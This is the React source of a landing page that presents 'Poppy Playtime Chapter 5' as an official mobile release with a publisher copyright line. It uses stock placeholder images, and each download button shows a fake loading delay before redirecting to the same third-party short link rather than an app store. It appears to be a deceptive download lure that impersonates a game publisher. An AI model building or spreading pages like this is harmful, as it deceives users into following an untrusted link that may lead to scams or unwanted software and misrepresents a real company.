/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Download, 
  Play, 
  Smartphone, 
  Apple, 
  Loader2
} from 'lucide-react';

const DOWNLOAD_URL = "https://checkapp.site/cl/i/d22n61";
const TRAILER_URL = "https://www.youtube.com/watch?v=EriEensiy0I";

// Using high-quality horror-themed placeholders since local files might be missing
const IMAGES = {
  HERO: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=1920&auto=format&fit=crop',
  HUGGY: 'https://images.unsplash.com/photo-1509248961158-e54f6934749c?q=80&w=800&auto=format&fit=crop',
};

export default function App() {
  const [scrolled, setScrolled] = useState(false);
  const [showPlatforms, setShowPlatforms] = useState(false);
  const [loadingPlatform, setLoadingPlatform] = useState<string | null>(null);

  useEffect(() => {
    const handleScroll = () => setScrolled(window.scrollY > 50);
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const handleDownload = () => {
    setShowPlatforms(true);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePlatformDownload = (platform: string) => {
    setLoadingPlatform(platform);
    setTimeout(() => {
      window.location.href = DOWNLOAD_URL;
      setLoadingPlatform(null);
    }, 3000); // Reduced to 3s for better UX
  };

  return (
    <div className="min-h-screen bg-[#050505] text-white selection:bg-red-600 selection:text-white overflow-x-hidden font-sans">
      {/* Navigation */}
      <nav className={`fixed top-0 left-0 right-0 z-50 transition-all duration-500 ${scrolled ? 'bg-black/80 backdrop-blur-md py-4' : 'bg-transparent py-8'}`}>
        <div className="max-w-7xl mx-auto px-6 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <span className="text-2xl font-display font-black tracking-tighter text-red-700 uppercase">PP-C5</span>
            <span className="hidden sm:inline-block px-3 py-1 bg-white/5 rounded text-[8px] font-bold uppercase tracking-widest text-white/30 border border-white/5">
              Mobile Edition
            </span>
          </div>
          <button 
            onClick={handleDownload}
            disabled={!!loadingPlatform}
            className="bg-red-700 hover:bg-red-600 px-6 py-2 rounded-full text-xs font-bold uppercase tracking-widest transition-all active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            {loadingPlatform ? 'Preparing...' : 'Download Now'}
          </button>
        </div>
      </nav>

      {/* Hero Section */}
      <section className="relative h-screen flex items-center justify-center overflow-hidden">
        <div className="absolute inset-0 z-0">
          <motion.img 
            initial={{ scale: 1.1, opacity: 0 }}
            animate={{ scale: 1, opacity: 0.5 }}
            transition={{ duration: 2 }}
            src={IMAGES.HERO} 
            className="w-full h-full object-cover"
            referrerPolicy="no-referrer"
          />
          <div className="absolute inset-0 bg-gradient-to-t from-[#050505] via-transparent to-black/40" />
        </div>

        <div className="relative z-10 text-center px-6 max-w-4xl">
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.5 }}
          >
            <span className="inline-block px-4 py-1 bg-red-900/30 border border-red-500/30 rounded-full text-[10px] font-bold uppercase tracking-[0.3em] text-red-400 mb-6">
              Official Release
            </span>
            <h1 className="text-7xl md:text-9xl font-display font-black uppercase tracking-tighter leading-[0.85] mb-8">
              Poppy <br />
              <span className="text-red-700">Playtime</span>
            </h1>
            <p className="text-lg md:text-2xl font-light text-white/60 mb-8 max-w-2xl mx-auto leading-relaxed italic">
              The nightmare returns. Chapter 5 is now available for download.
            </p>
            
            <div className="flex items-center justify-center gap-4 mb-10 text-white/40">
              <div className="flex items-center gap-2 px-4 py-2 bg-white/5 rounded-lg border border-white/5">
                <Smartphone className="w-4 h-4" />
                <span className="text-[10px] font-bold uppercase tracking-widest">Android & iOS</span>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row items-center justify-center gap-4 min-h-[80px]">
              <AnimatePresence mode="wait">
                {!showPlatforms ? (
                  <motion.button 
                    key="main-btn"
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.9 }}
                    onClick={handleDownload}
                    className="w-full sm:w-auto bg-red-700 hover:bg-red-600 px-12 py-6 rounded-full font-black uppercase tracking-widest flex items-center justify-center gap-3 transition-all group shadow-2xl shadow-red-900/20 cursor-pointer"
                  >
                    <Download className="w-6 h-6 group-hover:scale-110 transition-transform" />
                    Download Now
                  </motion.button>
                ) : (
                  <motion.div 
                    key="platform-btns"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="flex flex-col items-center gap-4 w-full sm:w-auto"
                  >
                    <div className="flex flex-col sm:flex-row gap-4 w-full sm:w-auto">
                      <button 
                        disabled={!!loadingPlatform}
                        onClick={() => handlePlatformDownload('android')}
                        className="w-full sm:w-auto bg-emerald-700 hover:bg-emerald-600 px-10 py-6 rounded-full font-black uppercase tracking-widest flex items-center justify-center gap-3 transition-all group shadow-2xl shadow-emerald-900/20 disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                      >
                        {loadingPlatform === 'android' ? (
                          <Loader2 className="w-6 h-6 animate-spin" />
                        ) : (
                          <Smartphone className="w-6 h-6 group-hover:scale-110 transition-transform" />
                        )}
                        {loadingPlatform === 'android' ? 'Redirecting...' : 'Android'}
                      </button>
                      <button 
                        disabled={!!loadingPlatform}
                        onClick={() => handlePlatformDownload('ios')}
                        className="w-full sm:w-auto bg-blue-700 hover:bg-blue-600 px-10 py-6 rounded-full font-black uppercase tracking-widest flex items-center justify-center gap-3 transition-all group shadow-2xl shadow-blue-900/20 disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
                      >
                        {loadingPlatform === 'ios' ? (
                          <Loader2 className="w-6 h-6 animate-spin" />
                        ) : (
                          <Apple className="w-6 h-6 group-hover:scale-110 transition-transform" />
                        )}
                        {loadingPlatform === 'ios' ? 'Redirecting...' : 'iOS'}
                      </button>
                    </div>
                    {loadingPlatform && (
                      <motion.a 
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        href={DOWNLOAD_URL}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-[10px] text-white/30 underline uppercase tracking-widest hover:text-white transition-colors"
                      >
                        Click here if not redirected automatically
                      </motion.a>
                    )}
                  </motion.div>
                )}
              </AnimatePresence>
              
              {!showPlatforms && (
                <button 
                  onClick={() => window.open(TRAILER_URL, '_blank')}
                  className="w-full sm:w-auto bg-white/5 hover:bg-white/10 border border-white/10 px-12 py-6 rounded-full font-black uppercase tracking-widest flex items-center justify-center gap-3 transition-all cursor-pointer"
                >
                  <Play className="w-6 h-6 fill-current" />
                  Watch Trailer
                </button>
              )}
            </div>
          </motion.div>
        </div>

        {/* Scroll Indicator */}
        <motion.div 
          animate={{ y: [0, 10, 0] }}
          transition={{ repeat: Infinity, duration: 2 }}
          className="absolute bottom-10 left-1/2 -translate-x-1/2 opacity-30"
        >
          <div className="w-px h-12 bg-gradient-to-b from-white to-transparent" />
        </motion.div>
      </section>

      {/* Features Section */}
      <section className="py-24 px-6 max-w-7xl mx-auto">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          {[
            { title: "New Monsters", desc: "Encounter terrifying new experiments in the depths of the factory." },
            { title: "Mobile Optimized", desc: "Smooth 60FPS gameplay tailored for high-end mobile devices." },
            { title: "Deep Lore", desc: "Uncover the final secrets of Playtime Co. and the prototype." }
          ].map((feature, i) => (
            <motion.div 
              key={i}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: i * 0.1 }}
              className="p-8 bg-white/5 border border-white/10 rounded-3xl hover:bg-white/10 transition-colors group"
            >
              <h3 className="text-xl font-display font-black uppercase mb-4 text-red-500 group-hover:text-red-400 transition-colors">{feature.title}</h3>
              <p className="text-white/50 leading-relaxed">{feature.desc}</p>
            </motion.div>
          ))}
        </div>
      </section>

      {/* Footer */}
      <footer className="py-12 px-6 bg-black border-t border-white/5">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6 opacity-40">
          <div className="flex flex-col items-center md:items-start gap-2">
            <span className="text-xl font-display font-black tracking-tighter text-red-700 uppercase">PP-C5</span>
            <span className="text-[8px] font-bold uppercase tracking-widest text-white/50">Mobile Edition (Android & iOS)</span>
          </div>
          <p className="text-[10px] uppercase tracking-[0.2em] text-center">
            © 2026 MOB Entertainment. All rights reserved.
          </p>
          <div className="flex gap-8 text-[10px] font-bold uppercase tracking-widest">
            <a href="#" className="hover:text-red-500 transition-colors">Privacy</a>
            <a href="#" className="hover:text-red-500 transition-colors">Terms</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
